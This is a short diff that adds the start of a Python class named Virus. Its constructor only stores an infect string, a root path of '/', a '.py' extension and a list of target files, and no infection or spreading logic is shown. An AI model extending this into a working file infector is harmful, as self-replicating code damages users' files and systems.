@@ -1,0 +1,8 @@
+class Virus:
+    
+    def __init__(self, infect_string="I am a Virus", path="/", \
+                         extension=".py", target_file_list=[]):
+            self.infect_string = infect_string
+            self.path = path
+            self.extension = extension
+            self.target_file_list = target_file_list
